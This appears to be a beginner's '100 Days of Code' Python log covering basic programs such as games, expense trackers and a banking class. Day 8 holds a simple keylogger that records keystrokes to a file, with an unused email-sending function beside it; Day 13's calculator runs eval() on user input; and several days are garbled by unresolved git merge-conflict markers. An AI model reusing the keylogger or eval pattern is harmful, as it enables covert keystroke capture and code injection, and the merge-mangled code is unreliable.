# My100DaysOfCode

DAY 01
====================
### Day 1: Introduction to Python
### Author: ABDULLAHI AHMED OSman
### Date: 2025-01-01
### Description: This is the first day of my 100 days of code challenge. I will begin by introducing myself and explaining the purpose of this challenge.
### Code: This is a simple Python script that prints out a message to the user.

def introduction_to_python():
    print("Hello, World!")
    print("Welcome to my 100 days of code challenge.")
    print("I'm ABDULLAHI ABDULLAHI, and I'm excited to start this journey.")
    print("Over the next 100 days, I'll be learning and coding every day.")
    print("I'll be sharing my progress and experiences along the way.")
    print("Thanks for joining me on this journey!")

introduction_to_python()

DAY 02
====================
### Day 2: Variables and Data Types
### Author: ABDULLAHI AHMED OSman
### Date: 2025-01-02
### Description: In this day, I will be learning about variables and data types in Python.
### Code: This is a simple Python script that demonstrates the use of variables and data types.

def variables_and_data_types():
    full_name = "Abdullahi Ahmed Osman"
    current_age = 21

    print(f"My full name is {full_name} and I am {current_age} years old.")

    print("Data Types in Python:")
    print("1. Integers:", type(current_age))
    print("2. Floats:", type(3.14))
    print("3. Strings:", type(full_name))
    print("4. Boolean:", type(True))
    print("5. List:", type([1, 2, 3]))
    print("6. Tuple:", type((1, 2, 3)))

variables_and_data_types()

DAY 03
====================
### Day 3: Basic Operators
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-03
### Description: In this day, I will be learning about basic operators in Python.
### Code: This is a simple Python script that demonstrates the use of basic operators.

def basic_operators():
    x = 10
    y = 5

    print("Arithmetic Operators:")
    print(f"1. Addition: {x} + {y} = {x + y}")
    print(f"2. Subtraction: {x} - {y} = {x - y}")
    print(f"3. Multiplication: {x} * {y} = {x * y}")
    print(f"4. Division: {x} / {y} = {x / y}")

    print("\nComparison Operators:")
    print(f"1. Equal to: {x} == {y} = {x == y}")
    print(f"2. Not equal to: {x} != {y} = {x != y}")
    print(f"3. Greater than: {x} > {y} = {x > y}")
    print(f"4. Less than: {x} < {y} = {x < y}")

    print("\nLogical Operators:")
    print(f"1. And: {x} > 5 and {x} < 15 = {x > 5 and x < 15}")
    print(f"2. Or: {x} > 5 or {x} < 5 = {x > 5 or x < 5}")

basic_operators()

DAY 04
====================
### Day 4: Control Structures
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-04
### Description: In this day, I will be learning about control structures in Python.
### Code: This is a simple Python script that demonstrates the use of control structures.

def control_structures():
    x = 10
    y = 5

    if x > y:  
        print(f"{x} is greater than {y}")
    elif x == y:
        print(f"{x} is equal to {y}")
    else:
        print(f"{x} is less than {y}")

    print("\nFor Loop:")
    for i in range(5):
        print(i)

    print("\nWhile Loop:")
    i = 0
    while i < 5:
        print(i)
        i += 1

    print("\nNested If-Else Statement:")
    if x > y:  
        if x > 10:
            print(f"{x} is greater than 10")
        else:
            print(f"{x} is less than or equal to 10")
    else:
        print(f"{x} is less than or equal to {y}")

    print("\nBreak and Continue Statements:")
    for i in range(5):
        if i == 3:
            break
        print(i)

    print("\nContinue Statement:")
    for i in range(5):
        if i == 3:
            continue
        print(i)

control_structures()

DAY 05
================
### Day 5: Functions
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-05
### Description: In this day, I will be learning about functions in Python.
### Code: This is a simple Python script that demonstrates the use of functions.

def greet(name: str) -> None:
    """Prints a personalized greeting message"""
    print(f"Hello, {name}!")

def add(x: int, y: int) -> int:
    """Returns the sum of two numbers"""
    return x + y

def main() -> None:
    """Main function to test the greet and add functions"""
    greet("Abdullahi")
    print(add(5, 10))

if __name__ == "__main__":
    main()
    # Output: Hello, Abdullahi! 15
    functions()


DAY 06
================
### Day 6: Modules
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-06
### Description: In this day, I will be learning about modules in Python.
### Code: This is a simple Python script that demonstrates the use of modules.
import math
import random
import datetime
import time
import os
import sys
import platform
import requests 
import json
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import plotly.express as px
import plotly.graph_objects as go

def modules_example():
    """Demonstrates the use of various Python modules"""
    print("Math Module:")
    print("Square root of 16:", math.sqrt(16))
    print("Random Module:")
    print("Random number between 1 and 10:", random.randint(1, 10))
    print("Date and Time Module:")
    print("Current date and time:", datetime.datetime.now())
    print("Time Module:")
    print("Current time in seconds since the epoch:", time.time())
    print("OS Module:")
    print("Current operating system:", os.name)
    print("System Module:")
    print("Current system platform:", sys.platform)
    print("Platform Module:")
    print("Current platform:", platform.platform())
    print("Requests Module:")
    response = requests.get("https://www.example.com")
    print("Status code:", response.status_code)
    print("JSON Module:")
    data = json.loads('{"name": "John", "age": 30}')
    print("Name:", data["name"])
    print("Age:", data["age"])
    print("Pandas Module:")
    data = pd.DataFrame({'Name': ['John', 'Anna', 'Peter'], 'Age': [28, 24, 35]})
    print(data)
    print("NumPy Module:")
    array = np.array([1, 2, 3, 4, 5])
    print("Array:", array)
    print("Matplotlib Module:")
    plt.plot([1, 2, 3, 4, 5])
    plt.show()
    print("Seaborn Module:")
    sns.set()
    plt.plot([1, 2, 3, 4, 5])
    plt.show()
    print("Plotly Module:")
    fig = go.Figure(data=[go.Scatter(x=[1, 2, 3, 4, 5], y=[1, 2, 3, 4, 5])])
    fig.show()

modules_example()

DAY 07
================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-07
### Description: This is the seventh day of the 100 Days of Code challenge.
### The task is to create a program that can play a simple game of Rock, Paper, Sc
import random

def game():
    while True:
        user = input("Enter a choice (rock, paper, scissors) or 'quit' to exit: ").lower()
        if user == "quit":
            break
        elif user not in ["rock", "paper", "scissors"]:
            print("Invalid input. Please try again.")
            continue

        computer = random.choice(["rock", "paper", "scissors"])
        print(f"\nYou chose {user}, computer chose {computer}.\n")

        if user == computer:
            print(f"Both players selected {user}. It's a tie!")
        elif user == "rock":
            if computer == "scissors":
                print("Rock smashes scissors! You win!")
            else:
                print("Paper covers rock! You lose.")
        elif user == "paper":
            if computer == "rock":
                print("Paper covers rock! You win!")
            else:
                print("Scissors cuts paper! You lose.")
        elif user == "scissors":
            if computer == "paper":
                print("Scissors cuts paper! You win!")
            else:
                print("Rock smashes scissors! You lose.")

game()

DAY 8
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-08
### Description: This is the eighth day of the 100 Days of Code challenge.
 my_branch
### The task is to create a program that can verify email address 
=======
### The task is to create a program that can verify email address and Key Logger
  Osman--branch

import re

def verify_email(email):
    """
    Verifies if the given email address is valid.
    
    Args:
        email (str): The email address to verify.
    
    Returns:
        bool: True if the email address is valid, False otherwise.
    """
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
 my_branch
    try:
        return bool(re.match(email_regex, email))
    except TypeError:
=======
    if re.match(email_regex, email):
        return True
    else:
  Osman--branch
        return False

def main():
    # Test the verify_email function
  my_branch
    emails = ["alpha62@gmail.com.com", "musabihi6563@gmail.com", "test@.com", None, 123]
    for email in emails: 
=======
    emails = ["test@example.com", "test.example.com", "test@.com"]
    for email in emails:
  Osman--branch
        print(f"Email: {email}, Valid: {verify_email(email)}")

if __name__ == "__main__":
    main()

  my_branch
=======
import keyboard
import time
import threading
import logging
import datetime
import os
import platform

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(event):
    logging.info(f'Key pressed: {event.name}')

def on_key_release(event):
    logging.info(f'Key released: {event.name}')

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        # Keep the program running until manually stopped
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('Program stopped manually')
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()

import os
import platform
import time
import datetime
import logging
import threading
import keyboard
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(event):
    logging.info(f'Key pressed: {event.name}')

def on_key_release(event):
    logging.info(f'Key released: {event.name}')

def send_email(subject, message, from_addr, to_addr, password):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        # Keep the program running until manually stopped
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('Program stopped manually')
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()

  Osman--branch
 DAY 9
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-09
### Description: This is the ninth day of the 100 Days of Code challenge.
### The task is to create a simple email client using Python's smtplib and email libraries.

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email(subject, message, from_addr, to_addr, password):
    """
    Sends an email using the provided details.
    
    Args:
        subject (str): The subject of the email.
        message (str): The body of the email.
        from_addr (str): The sender's email address.
        to_addr (str): The recipient's email address.
        password (str): The sender's email password.
    """
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

def main():
    """
    Asks for user input and sends an email using the provided details.
    """
    subject = input("Enter the subject of the email: ")
    message = input("Enter the body of the email: ")
    from_addr = input("Enter your email address: ")
    to_addr = input("Enter the recipient's email address: ")
    password = input("Enter your email password: ")
    
    try:
        send_email(subject, message, from_addr, to_addr, password)
        print("Email sent successfully!")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

  my_branch
 DAY 10
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-10
### Description: This is the tenth day of the 100 Days of Code challenge.
=======
DAY 10
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-10
### Description: This is the ninth day of the 100 Days of Code challenge.
  Osman--branch
### The task is to create a program that can send an email using the provided details.
### The program should ask for user input for the subject, message, sender's email address, recipient
's email address, and sender's email password.
### The program should then send an email using the provided details.
  my_branch

=======
### The program should handle any exceptions that may occur during the email sending process.
### The program should print a success message if the email is sent successfully.
### The program should print an error message if an exception occurs during the email sending process.
### The program should use the smtplib library to send the email.
### The program should use the MIMEMultipart class to create a multipart message.
### The program should use the MIMEText class to create a plain text message.
### The program should use the starttls method to start a TLS connection with the SMTP server.
### The program should use the login method to login to the sender's email account.
### The program should use the sendmail method to send the email.
### The program should use the quit method to close the SMTP connection.
### The program should use the keyboard library to listen for keyboard events.
### The program should use the on_key_press and on_key_release functions to handle keyboard events.
### The program should use the join method to wait for the keyboard listener to stop.
### The program should use the finally block to print a message when the program stops.
### The program should use the if __name__ == "__main__": block to ensure the main
function is called when the program is run directly.
python
 Osman--branch
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email(subject, message, from_addr, to_addr, password):
    """
    Sends an email using the provided details.
    
    Args:
        subject (str): The subject of the email.
        message (str): The body of the email.
        from_addr (str): The sender's email address.
        to_addr (str): The recipient's email address.
        password (str): The sender's email password.
    """
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

def main():
    """
    Asks for user input and sends an email using the provided details.
    """
    subject = input("Enter the subject of the email: ")
    message = input("Enter the body of the email: ")
    from_addr = input("Enter your email address: ")
    to_addr = input("Enter the recipient's email address: ")
    password = input("Enter your email password: ")
    
    try:
        send_email(subject, message, from_addr, to_addr, password)
        print("Email sent successfully!")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

DAY 11
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-11
### Description: This is the eleventh day of the 100 Days of Code challenge.
### The task is to create a program that allows to track our expenses and income. The program should be able to add, remove, and display expenses and income.
 my_branch
### The program should also be able to calculate the total income and total expenses.
### The task is to create a simple expense tracker using Python classes.
=======
### The program should also be able to calculate the total income and total expenses
  Osman--branch
python
class ExpenseTracker:
    def __init__(self):
        self.expenses = {}
        self.income = 0

    def add_expense(self, name, amount):
        if amount < 0:
            print("Expense amount cannot be negative.")
        else:
            self.expenses[name] = amount

    def remove_expense(self, name):
        if name in self.expenses:
            del self.expenses[name]
        else:
            print("Expense not found.")

    def display_expenses(self):
        if not self.expenses:
            print("No expenses added.")
        else:
            for name, amount in self.expenses.items():
                print(f"{name}: ${amount:.2f}")

    def add_income(self, amount):
        if amount < 0:
            print("Income amount cannot be negative.")
        else:
            self.income += amount

    def display_income(self):
        print(f"Total income: ${self.income:.2f}")

    def calculate_total_expenses(self):
        return sum(self.expenses.values())

    def display_balance(self):
        total_expenses = self.calculate_total_expenses()
        balance = self.income - total_expenses
        print(f"Total expenses: ${total_expenses:.2f}")
        print(f"Balance: ${balance:.2f}")

def main():
    tracker = ExpenseTracker()
    while True:
        print("\n1. Add expense")
        print("2. Remove expense")
        print("3. Display expenses")
        print("4. Add income")
        print("5. Display income")
        print("6. Display balance")
        print("7. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            tracker.add_expense(input("Enter expense name: "), float(input("Enter expense amount: ")))
        elif choice == "2":
            tracker.remove_expense(input("Enter expense name: "))
        elif choice == "3":
            tracker.display_expenses()
        elif choice == "4":
            tracker.add_income(float(input("Enter income amount: ")))
        elif choice == "5":
            tracker.display_income()
        elif choice == "6":
            tracker.display_balance()
        elif choice == "7":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

 my_branch
 DAY 12
=======

DAY 12
  Osman--branch
==============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-12
### Description: This is the twelfth day of the 100 Days of Code challenge.
### The task is to create a program that allows to track power usage in a house.
### The program should be able to add, remove, and display power usage for each device.
### The program should also be able to calculate the total power usage and display it.
### The program should be able to calculate the cost of the power usage based on the cost per unit
### and display it.
### The program should be able to display the total cost of the power usage for each device.
### The program should be able to display the total cost of the power usage for all devices.

class PowerUsageTracker:
    def __init__(self):
        self.devices = {}
        self.cost_per_unit = 0

    def add_device(self, name, power_usage):
        if power_usage < 0:
            print("Power usage cannot be negative.")
        else:
            self.devices[name] = power_usage

    def remove_device(self, name):
        if name in self.devices:
            del self.devices[name]
        else:
            print("Device not found.")

    def display_devices(self):
        if not self.devices:
            print("No devices added.")
        else:
            for name, power_usage in self.devices.items():
                print(f"{name}: {power_usage} units")

    def calculate_total_power_usage(self):
        return sum(self.devices.values())

    def display_total_power_usage(self):
        total_power_usage = self.calculate_total_power_usage()
        print(f"Total power usage: {total_power_usage} units")

    def set_cost_per_unit(self, cost):
        if cost < 0:
            print("Cost per unit cannot be negative.")
        else:
            self.cost_per_unit = cost

    def calculate_total_cost(self):
        total_power_usage = self.calculate_total_power_usage()
        return total_power_usage * self.cost_per_unit

    def display_total_cost(self):
        total_cost = self.calculate_total_cost()
        print(f"Total cost: ${total_cost:.2f}")

    def display_device_cost(self):
        if not self.devices:
            print("No devices added.")
        else:
            for name, power_usage in self.devices.items():
                device_cost = power_usage * self.cost_per_unit
                print(f"{name}: ${device_cost:.2f}")

def main():
    tracker = PowerUsageTracker()
    while True:
        print("\n1. Add device")
        print("2. Remove device")
        print("3. Display devices")
        print("4. Calculate total power usage")
        print("5. Set cost per unit")
        print("6. Calculate total cost")
        print("7. Display device cost")
        print("8. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            tracker.add_device(input("Enter device name: "), float(input("Enter power usage: ")))
        elif choice == "2":
            tracker.remove_device(input("Enter device name: "))
        elif choice == "3":
            tracker.display_devices()
        elif choice == "4":
            tracker.display_total_power_usage()
        elif choice == "5":
            tracker.set_cost_per_unit(float(input("Enter cost per unit: ")))
        elif choice == "6":
            tracker.display_total_cost()
        elif choice == "7":
            tracker.display_device_cost()
        elif choice == "8":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

DAY 13
==============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-13
### Description: This is the Thirteen day of the 100 Days of Code challenge.
### The task is to create a calculator that can perform complex calculations with multiple operations.

class Calculator:
    def __init__(self):
        self.history = []

    def add(self, num1, num2):
        result = num1 + num2
        self.history.append(f"Added {num1} and {num2}, result = {result}")
        return result

    def subtract(self, num1, num2):
        result = num1 - num2
        self.history.append(f"Subtracted {num2} from {num1}, result = {result}")
        return result

    def multiply(self, num1, num2):
        result = num1 * num2
        self.history.append(f"Multiplied {num1} and {num2}, result = {result}")
        return result

    def divide(self, num1, num2):
        if num2 == 0:
            raise ValueError("Cannot divide by zero")
        result = num1 / num2
        self.history.append(f"Divided {num1} by {num2}, result = {result}")
        return result

    def calculate(self, expression):
        try:
            result = eval(expression)
            self.history.append(f"Calculated {expression}, result = {result}")
            return result
        except Exception as e:
            raise ValueError(f"Invalid expression: {e}")

    def display_history(self):
        for entry in self.history:
            print(entry)

def main():
    calculator = Calculator()
    while True:
        print("\n1. Add")
        print("2. Subtract")
        print("3. Multiply")
        print("4. Divide")
        print("5. Calculate expression")
        print("6. Display history")
        print("7. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            num1 = float(input("Enter first number: "))
            num2 = float(input("Enter second number: "))
            print(f"Result: {calculator.add(num1, num2)}")
        elif choice == "2":
            num1 = float(input("Enter first number: "))
            num2 = float(input("Enter second number: "))
            print(f"Result: {calculator.subtract(num1, num2)}")
        elif choice == "3":
            num1 = float(input("Enter first number: "))
            num2 = float(input("Enter second number: "))
            print(f"Result: {calculator.multiply(num1, num2)}")
        elif choice == "4":
            num1 = float(input("Enter first number: "))
            num2 = float(input("Enter second number: "))
            try:
                print(f"Result: {calculator.divide(num1, num2)}")
            except ValueError as e:
                print(e)
        elif choice == "5":
            expression = input("Enter expression: ")
            try:
                print(f"Result: {calculator.calculate(expression)}")
            except ValueError as e:
                print(e)
        elif choice == "6":
            calculator.display_history()
        elif choice == "7":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

DAY 14
==============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-14
### Description: This is the Fourteenth day of the 100 Days of Code challenge.
### The task is to create a program that can simulate a simple banking system. The program should be able to create a new account, deposit money, withdraw money, and check the account balance.
### The program should also be able not to allow a user to withdraw more money than they have in
# their account.
### The program should also be able to display the account history.
### The program should also be able to display the account details.
### The program should also be able to display the account balance.
### The program should also be able to display the account type.
### The program should also be able to display the account status.
### The program should also be able to display the account number.
### The program should also be able to display the account holder's name.
### The program should also be able to display the account holder's email.
### The program should also be able to display the account holder's phone number.
### The program should also be able to display the account holder's address.
### The program should also be able to display the account holder's date of birth.
### The program should also be able to display the account holder's age.
### The program should also be able to display the account holder's gender.
### The program should also be able to display the account holder's occupation.
### The program should also be able to display the account holder's marital status.
### The program should also be able to display the account holder's nationality.
### The program should also be able to display the account holder's ID number.
### The program should also be able to display the account holder's ID type.
### The program should also be able to display the account holder's ID issue date.
### The program should also be able to display the account holder's ID expiration date.
### The program should also be able to display the account holder's ID issuing authority.
### The program should also be able to display the account holder's ID issuing country.
### The program should also be able to display the account holder's ID issuing state.
### The program should also be able to display the account holder's ID issuing city.
### The program should also be able to display the account holder's ID issuing zip code.
### The program should also be able to display the account holder's ID issuing address.
### The program should also be able to display the account holder's ID issuing region.

class BankAccount:
    def __init__(self, account_number, account_holder_name, email, phone_number, address, date_of_birth, age, gender, occupation, marital_status, nationality, id_number, id_type, id_issue_date, id_expiration_date, id_issuing_authority, id_issuing_country, id_issuing_state, id_issuing_city, id_issuing_zip_code, id_issuing_address, id_issuing_region):
        self.account_number = account_number
        self.account_holder_name = account_holder_name
        self.email = email
        self.phone_number = phone_number
        self.address = address
        self.date_of_birth = date_of_birth
        self.age = age
        self.gender = gender
        self.occupation = occupation
        self.marital_status = marital_status
        self.nationality = nationality
        self.id_number = id_number
        self.id_type = id_type
        self.id_issue_date = id_issue_date
        self.id_expiration_date = id_expiration_date
        self.id_issuing_authority = id_issuing_authority
        self.id_issuing_country = id_issuing_country
        self.id_issuing_state = id_issuing_state
        self.id_issuing_city = id_issuing_city
        self.id_issuing_zip_code = id_issuing_zip_code
        self.id_issuing_address = id_issuing_address
        self.id_issuing_region = id_issuing_region
        self.balance = 0
        self.account_history = []
        self.account_status = "Active"
        self.account_type = "Savings"

    def deposit(self, amount):
        if amount > 0:
            self.balance += amount
            self.account_history.append(f"Deposited ${amount:.2f}, new balance: ${self.balance:.2f}")
            print(f"Deposited ${amount:.2f}, new balance: ${self.balance:.2f}")
        else:
            print("Invalid deposit amount.")

    def withdraw(self, amount):
        if 0 < amount <= self.balance:
            self.balance -= amount
            self.account_history.append(f"Withdrew ${amount:.2f}, new balance: ${self.balance:.2f}")
            print(f"Withdrew ${amount:.2f}, new balance: ${self.balance:.2f}")
        elif amount <= 0:
            print("Invalid withdrawal amount.")
        else:
            print("Insufficient funds.")

    def check_balance(self):
        print(f"Current balance: ${self.balance:.2f}")

    def display_account_history(self):
        for entry in self.account_history:
            print(entry)

    def display_account_details(self):
        print(f"Account Number: {self.account_number}")
        print(f"Account Holder Name: {self.account_holder_name}")
        print(f"Email: {self.email}")
        print(f"Phone Number: {self.phone_number}")
        print(f"Address: {self.address}")
        print(f"Date of Birth: {self.date_of_birth}")
        print(f"Age: {self.age}")
        print(f"Gender: {self.gender}")
        print(f"Occupation: {self.occupation}")
        print(f"Marital Status: {self.marital_status}")
        print(f"Nationality: {self.nationality}")
        print(f"ID Number: {self.id_number}")
        print(f"ID Type: {self.id_type}")
        print(f"ID Issue Date: {self.id_issue_date}")
        print(f"ID Expiration Date: {self.id_expiration_date}")
        print(f"ID Issuing Authority: {self.id_issuing_authority}")
        print(f"ID Issuing Country: {self.id_issuing_country}")
        print(f"ID Issuing State: {self.id_issuing_state}")
        print(f"ID Issuing City: {self.id_issuing_city}")
        print(f"ID Issuing Zip Code: {self.id_issuing_zip_code}")
        print(f"ID Issuing Address: {self.id_issuing_address}")
        print(f"ID Issuing Region: {self.id_issuing_region}")
        print(f"Account Status: {self.account_status}")
        print(f"Account Type: {self.account_type}")

def main():
    account = BankAccount("1234567890", "John Doe", "abdi@example.com", "123-456-7890", "123 Main St", "1990-01-01", 33, "Male", "Software Engineer", "Married", "American", "1234567890", "Driver's License", "2020-01-01", "2025-01-01", "DMV", "USA", "California", "Los Angeles", "12345", "123 Main St", "West Coast")
    while True:
        print("\n1. Deposit")
        print("2. Withdraw")
        print("3. Check Balance")
        print("4. Display Account History")
        print("5. Display Account Details")
        print("6. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            amount = float(input("Enter deposit amount: "))
            account.deposit(amount)
        elif choice == "2":
            amount = float(input("Enter withdrawal amount: "))
            account.withdraw(amount)
        elif choice == "3":
            account.check_balance()
        elif choice == "4":
            account.display_account_history()
        elif choice == "5":
            account.display_account_details()
        elif choice == "6":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()

  my_branch

=======
  Osman--branch
DAY 15
================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-15
### Description: This is the Fifteenth day of the 100 Days of Code challenge.
### The task is to create a simple program that can simulate a library management system. The program should be able to add, remove, and display books. The program should also be able to display the total number of books in the library.

class Library:
    def __init__(self):
        self.books = []

    def add_book(self, title, author, publication_year):
        self.books.append({
            "title": title,
            "author": author,
            "publication_year": publication_year
        })

    def remove_book(self, title):
        for book in self.books:
            if book["title"] == title:
                self.books.remove(book)
                print(f"{title} removed from the library.")
                return
        print(f"{title} not found in the library.")

    def display_books(self):
        if not self.books:
            print("No books in the library.")
        else:
            for book in self.books:
                print(f"Title: {book['title']}, Author: {book['author']}, Publication Year: {book['publication_year']}")

    def display_total_books(self):
        print(f"Total number of books in the library: {len(self.books)}")

def main():
    library = Library()
    while True:
        print("\n1. Add book")
        print("2. Remove book")
        print("3. Display books")
        print("4. Display total books")
        print("5. Quit")
        choice = input("Enter your choice: ")
        if choice == "1":
            title = input("Enter book title: ")
            author = input("Enter book author: ")
            publication_year = input("Enter book publication year: ")
            library.add_book(title, author, publication_year)
        elif choice == "2":
            title = input("Enter book title: ")
            library.remove_book(title)
        elif choice == "3":
            library.display_books()
        elif choice == "4":
            library.display_total_books()
        elif choice == "5":
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
 my_branch
    main()
=======
    main()

  Osman--branch

  DAY 16
================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-16
### Description: This is the Sixteenth day of the 100 Days of Code challenge.
### Description: In this day, I will be learning about Object-Oriented Programming (OOP) in Python.
### Description: I will be creating a simple parking system using OOP principles.
### Description: The parking system will have the following features:
### Description: 1. Parking Lot: This will be the main class that will handle all the
### Description: parking lot operations.
### Description: 2. Vehicle: This will be the class that will represent a vehicle.
### Description: 3. Parking Ticket: This will be the class that will represent a parking ticket
### Description: 4. Parking Spot: This will be the class that will represent a parking spot
### Description: The parking system will have the following methods:
### Description: 1. park_vehicle: This method will park a vehicle in the parking lot.
### Description: 2. unpark_vehicle: This method will unpark a vehicle from the parking
### Description: lot.
### Description: 3. display_parking_lot: This method will display the parking lot
### Description: 4. display_parking_tickets: This method will display all the parking tickets
### Description: 5. display_parking_spots: This method will display all the parking spots
python
class ParkingLot:
    def __init__(self):
        self.parking_spots = []
        self.parking_tickets = []

    def add_parking_spot(self, spot):
        self.parking_spots.append(spot)

    def remove_parking_spot(self, spot):
        if spot in self.parking_spots:
            self.parking_spots.remove(spot)
        else:
            print("Parking spot not found.")

    def park_vehicle(self, vehicle, spot):
        if spot in self.parking_spots:
            self.parking_tickets.append(ParkingTicket(vehicle, spot))
            print(f"Vehicle {vehicle.license_plate} parked in spot {spot.spot_number}.")
        else:
            print("Parking spot not available.")

    def unpark_vehicle(self, vehicle):
        for ticket in self.parking_tickets:
            if ticket.vehicle == vehicle:
                self.parking_tickets.remove(ticket)
                print(f"Vehicle {vehicle.license_plate} unparked.")
                return
        print("Vehicle not found in parking lot.")

    def display_parking_lot(self):
        print("Parking Lot:")
        for spot in self.parking_spots:
            print(f"Spot {spot.spot_number}: {spot.spot_type}")

    def display_parking_tickets(self):
        print("Parking Tickets:")
        for ticket in self.parking_tickets:
            print(f"Vehicle {ticket.vehicle.license_plate} parked in spot {ticket.spot.spot_number}.")

    def display_parking_spots(self):
        print("Parking Spots:")
        for spot in self.parking_spots:
            print(f"Spot {spot.spot_number}: {spot.spot_type}")


class Vehicle:
    def __init__(self, license_plate, vehicle_type):
        self.license_plate = license_plate
        self.vehicle_type = vehicle_type


class ParkingTicket:
    def __init__(self, vehicle, spot):
        self.vehicle = vehicle
        self.spot = spot


class ParkingSpot:
    def __init__(self, spot_number, spot_type):
        self.spot_number = spot_number
        self.spot_type = spot_type


def main():
    parking_lot = ParkingLot()

    while True:
        print("\n1. Add parking spot")
        print("2. Remove parking spot")
        print("3. Park vehicle")
        print("4. Unpark vehicle")
        print("5. Display parking lot")
        print("6. Display parking tickets")
        print("7. Display parking spots")
        print("8. Quit")
        choice = input("Enter your choice: ")

        if choice == "1":
            spot_number = input("Enter parking spot number: ")
            spot_type = input("Enter parking spot type: ")
            parking_lot.add_parking_spot(ParkingSpot(spot_number, spot_type))
        elif choice == "2":
            spot_number = input("Enter parking spot number: ")
            parking_lot.remove_parking_spot(ParkingSpot(spot_number, ""))
        elif choice == "3":
            license_plate = input("Enter vehicle license plate: ")
            vehicle_type = input("Enter vehicle type: ")
            spot_number = input("Enter parking spot number: ")
            parking_lot.park_vehicle(Vehicle(license_plate, vehicle_type), ParkingSpot(spot_number, ""))
        elif choice == "4":
            license_plate = input("Enter vehicle license plate: ")
            parking_lot.unpark_vehicle(Vehicle(license_plate, ""))
        elif choice == "5":
            parking_lot.display_parking_lot()
        elif choice == "6":
            parking_lot.display_parking_tickets()
        elif choice == "7":
            parking_lot.display_parking_spots()
        elif choice == "8":
            break
        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()

DAY 17
=======================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-17
### Description: This is the  17th day of the 100 Days of Code challenge. 
### The task is to create a simple water meter
### that can measure the amount of water used by a household. The meter should be able to track
### the total amount of water used, the amount of water used today, and the amount of water
### used yesterday.
### The meter should also be able to display the current date and time.
### The meter should be able to display the total amount of water used, the amount of water used
### today, and the amount of water used yesterday.
### The meter should be able to display the current date and time.
### The meter should be able to display the current date and time.

from datetime import datetime
from datetime import timedelta

class WaterMeter:
    def __init__(self):
        self.total_water_used = 0
        self.water_used_today = 0
        self.water_used_yesterday = 0
        self.current_date = datetime.now()

    def add_water_used(self, amount):
        self.total_water_used += amount
        self.water_used_today += amount

    def display_info(self):
        print(f"Current Date and Time: {self.current_date}")
        print(f"Total Water Used: {self.total_water_used} units")
        print(f"Water Used Today: {self.water_used_today} units")

    def display_yesterday_water_used(self):
        print(f"Water Used Yesterday: {self.water_used_yesterday} units")

    def calculate_yesterday_water_used(self):
        today = datetime.now()
        if today.date() != self.current_date.date():
            self.water_used_yesterday = self.water_used_today
            self.water_used_today = 0
            self.current_date = today

    def main(self):
        while True:
            print("1. Add Water Used")
            print("2. Display Info")
            print("3. Display Yesterday's Water Used")
